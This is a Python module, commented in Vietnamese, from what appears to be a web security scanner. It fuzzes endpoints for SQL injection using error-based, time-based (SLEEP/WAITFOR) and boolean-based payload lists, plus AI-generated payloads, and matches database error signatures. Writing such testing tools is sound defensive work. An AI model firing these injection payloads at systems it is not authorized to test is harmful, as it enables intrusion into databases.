# =============================================================================
# fuzzer/sqli_fuzzer.py — Kiểm thử SQL Injection
#
# Kỹ thuật:
#   1. Error-based: inject payload → kiểm tra SQL error trong response
#   2. Time-based:  inject SLEEP/WAITFOR → đo thời gian response
#   3. Boolean-based: so sánh response TRUE vs FALSE condition
#
# Tham chiếu: OWASP Testing Guide OTG-INPVAL-005, CWE-89
# =============================================================================

import time
import logging
import requests

from fuzzer.models import LogEntry
import config

log = logging.getLogger(__name__)

HEADERS = {"User-Agent": "WebSentinel/1.0"}

# ─── Dấu hiệu SQL error trong response ───────────────────────────────────────
# Tham chiếu CWE-89 + OWASP Testing Guide
SQL_ERROR_SIGNATURES = [
    # MSSQL / ASP Classic
    "microsoft ole db", "odbc microsoft access", "odbc sql server",
    "unclosed quotation mark", "incorrect syntax near",
    "syntax error converting", "invalid column name",
    "[microsoft][odbc", "sql server", "procedure or function",
    # MySQL
    "you have an error in your sql", "warning: mysql",
    "mysql_fetch", "mysql_num_rows",
    # Oracle
    "ora-01756", "ora-00907", "ora-00933",
    # Generic
    "jdbc", "sqlstate", "supplied argument is not",
    "division by zero", "quoted string not properly terminated",
]

# ─── Payload theo từng kỹ thuật ───────────────────────────────────────────────
ERROR_BASED_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR 1=1--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "'; SELECT @@version--",
    "1' AND 1=CONVERT(int,@@version)--",
    "' OR 'x'='x",
    "admin'--",
    "' OR ''='",
]

TIME_BASED_PAYLOADS = [
    # MSSQL (ASP classic dùng MSSQL)
    "'; WAITFOR DELAY '0:0:4'--",
    "1; WAITFOR DELAY '0:0:4'--",
    # MySQL
    "' AND SLEEP(4)--",
    "1' AND SLEEP(4)--",
]

BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),   # (true_payload, false_payload)
    ("' OR 1=1--", "' OR 1=2--"),
]

TIME_THRESHOLD_MS = 3500  # ms — response chậm hơn ngưỡng này → suspect time-based


def fuzz_sqli(endpoints: list, ai_payloads: dict = None) -> list[LogEntry]:
    """
    Fuzz SQL Injection cho tất cả endpoint có likely_vulns chứa 'sqli'.

    Args:
        endpoints:   Danh sách Endpoint từ crawler
        ai_payloads: Payload bổ sung từ Payload Planner AI {ep_id: [payload,...]}

    Returns:
        Danh sách LogEntry
    """
    targets  = [ep for ep in endpoints if "sqli" in ep.likely_vulns]
    all_logs = []

    log.info(f"[sqli] Bắt đầu fuzz {len(targets)} endpoints")

    for ep in targets:
        log.info(f"[sqli] Testing {ep.method} {ep.url} | params={ep.params}")
        baseline = _get_baseline(ep)
        req_count = 0

        for param in ep.params:
            # Chỉ test param kiểu integer hoặc có tên nhạy cảm
            if ep.param_types.get(param) not in ("integer", "string"):
                continue

            # Gộp payload: mặc định + AI sinh thêm
            payloads = ERROR_BASED_PAYLOADS.copy()
            if ai_payloads and ep.id in ai_payloads:
                payloads += [p for p in ai_payloads[ep.id]
                             if p not in payloads]

            # ── Error-based ──────────────────────────────────────────────
            for payload in payloads:
                if req_count >= config.MAX_REQ_PER_EP: break
                entry = _send(ep, param, payload, "error_based", baseline)
                if entry:
                    all_logs.append(entry)
                    req_count += 1
                time.sleep(config.FUZZ_DELAY)

            # ── Time-based ───────────────────────────────────────────────
            for payload in TIME_BASED_PAYLOADS:
                if req_count >= config.MAX_REQ_PER_EP: break
                entry = _send(ep, param, payload, "time_based", baseline)
                if entry:
                    all_logs.append(entry)
                    req_count += 1
                time.sleep(config.FUZZ_DELAY)

            # ── Boolean-based ────────────────────────────────────────────
            for true_p, false_p in BOOLEAN_PAYLOADS:
                if req_count >= config.MAX_REQ_PER_EP: break
                entry = _send_boolean(ep, param, true_p, false_p, baseline)
                if entry:
                    all_logs.append(entry)
                    req_count += 1
                time.sleep(config.FUZZ_DELAY)

    vuln = sum(1 for l in all_logs if l.is_vulnerable)
    log.info(f"[sqli] Xong — {len(all_logs)} requests | {vuln} vulnerable")
    return all_logs


# ─── Request helpers ──────────────────────────────────────────────────────────

def _send(ep, param, payload, technique, baseline) -> LogEntry | None:
    try:
        t0 = time.time()
        resp, req_info = _make_request(ep, param, payload)
        ms = int((time.time() - t0) * 1000)

        body_snippet = _extract_snippet(resp.text, payload)
        vuln, conf   = _detect(technique, resp, baseline, ms, body_snippet)

        if vuln:
            log.warning(f"[sqli] ⚠ [{technique}] {ep.url} param={param} conf={conf}")

        return LogEntry(
            endpoint_id=ep.id, url=ep.url, param=param,
            vuln_type="sqli", payload=payload,
            technique=technique,
            request=req_info,
            response={
                "status":       resp.status_code,
                "length":       len(resp.content),
                "body_snippet": body_snippet,
            },
            baseline=baseline,
            is_vulnerable=vuln, confidence=conf, duration_ms=ms,
        )
    except requests.RequestException as e:
        log.debug(f"[sqli] Request lỗi: {e}")
        return None


def _send_boolean(ep, param, true_payload, false_payload, baseline) -> LogEntry | None:
    """
    Boolean-based: gửi 2 request (TRUE/FALSE condition)
    → nếu response khác nhau rõ rệt → vulnerable
    """
    try:
        resp_true,  _ = _make_request(ep, param, true_payload)
        time.sleep(0.3)
        resp_false, req_info = _make_request(ep, param, false_payload)

        len_true  = len(resp_true.content)
        len_false = len(resp_false.content)
        diff      = abs(len_true - len_false)

        # Response TRUE vs FALSE khác nhau >100 bytes → suspect boolean SQLi
        vuln = diff > 100 and resp_true.status_code == resp_false.status_code == 200
        conf = "medium" if vuln else "none"

        payload_combined = f"TRUE: {true_payload} | FALSE: {false_payload}"
        snippet = f"TRUE_len={len_true} FALSE_len={len_false} diff={diff}"

        if vuln:
            log.warning(f"[sqli] ⚠ [boolean] {ep.url} param={param} diff={diff}bytes")

        return LogEntry(
            endpoint_id=ep.id, url=ep.url, param=param,
            vuln_type="sqli", payload=payload_combined,
            technique="boolean_based",
            request=req_info,
            response={"status": resp_true.status_code,
                      "length": len_true, "body_snippet": snippet},
            baseline=baseline,
            is_vulnerable=vuln, confidence=conf, duration_ms=0,
        )
    except Exception as e:
        log.debug(f"[sqli] Boolean request lỗi: {e}")
        return None


def _make_request(ep, param, payload):
    params = {p: ("1" if p != param else payload) for p in ep.params}
    if ep.method == "GET":
        resp = requests.get(ep.url, params=params, headers=HEADERS,
                            timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
        req_info = {"url": resp.url, "method": "GET", "params": params, "payload": payload}
    else:
        resp = requests.post(ep.url, data=params, headers=HEADERS,
                             timeout=config.REQUEST_TIMEOUT, allow_redirects=True)
        req_info = {"url": ep.url, "method": "POST", "params": params, "payload": payload}
    return resp, req_info


def _detect(technique, resp, baseline, ms, body_snippet) -> tuple[bool, str]:
    body   = body_snippet.lower()
    status = resp.status_code
    bl_st  = baseline.get("status", 200)

    if technique == "error_based":
        # Tìm SQL error signature trong response
        for sig in SQL_ERROR_SIGNATURES:
            if sig in body:
                return True, "high"
        # Status 500 khác baseline → LOW (có thể do inject gây lỗi)
        if status == 500 and bl_st == 200:
            return True, "low"

    elif technique == "time_based":
        # Response chậm hơn ngưỡng → MEDIUM
        if ms > TIME_THRESHOLD_MS:
            return True, "medium"

    return False, "none"


def _get_baseline(ep) -> dict:
    try:
        params = {p: "1" for p in ep.params}
        if ep.method == "GET":
            r = requests.get(ep.url, params=params,
                             headers=HEADERS, timeout=config.REQUEST_TIMEOUT)
        else:
            r = requests.post(ep.url, data=params,
                              headers=HEADERS, timeout=config.REQUEST_TIMEOUT)
        return {"status": r.status_code, "length": len(r.content)}
    except Exception:
        return {"status": 0, "length": 0}


def _extract_snippet(body: str, payload: str) -> str:
    """Trích đoạn body quan trọng nhất để AI phân tích."""
    # Ưu tiên đoạn có SQL error
    for sig in ["error", "syntax", "odbc", "microsoft", "warning", "sql"]:
        idx = body.lower().find(sig)
        if idx != -1:
            return body[max(0, idx-50): idx+600]
    # Fallback
    return body[:800]